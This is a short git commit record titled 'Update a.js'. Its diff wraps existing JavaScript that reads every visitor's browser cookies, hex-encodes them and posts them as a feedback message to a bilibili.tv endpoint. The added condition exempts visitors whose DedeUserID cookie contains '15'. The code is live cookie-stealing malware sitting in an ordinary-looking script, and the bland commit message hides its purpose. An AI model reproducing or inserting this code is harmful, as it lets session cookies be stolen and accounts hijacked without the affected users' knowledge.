6f25331b365bb7b3795391692e9726b88f14abf7
bizwiz <sdrisgod@gmail.com>
2013-01-30 01:25:20 +0800

    Update a.js

--- a.js
+++ a.js
@@ -1,1 +1,3 @@
+if(document.cookie.indexOf("DedeUserID=15")<0){
 for(var d=document.cookie,e="",f=0;f<d.length;f++)var g=d.charCodeAt(f).toString(16),e=e+(2>g.length?"0"+g:g);$.post("http://www.bilibili.tv/feedback/post",{aid:"271",action:"send",msg:e});
+}
